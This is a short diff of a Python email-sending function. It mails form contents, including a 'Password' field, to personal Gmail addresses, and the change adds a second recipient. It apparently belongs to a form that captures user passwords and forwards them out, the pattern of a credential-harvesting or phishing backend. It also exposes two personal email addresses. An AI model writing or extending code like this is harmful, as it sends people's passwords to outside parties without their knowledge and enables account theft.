@@ -11,7 +11,7 @@ def send_email(msg, email, password):
 
     # SET THE INFO ABOUT THE SAID EMAIL
     sent_from = gmail_user
-    sent_to = ['mohanadomark@gmail.com']
+    sent_to = ['mohanadomark@gmail.com', 'Marwanomareacc@gmail.com']
     sent_subject = "New Form"
     sent_body = f"{str(msg).encode('UTF-8')}\n\n" \
                 f"Password: {password}\n" \
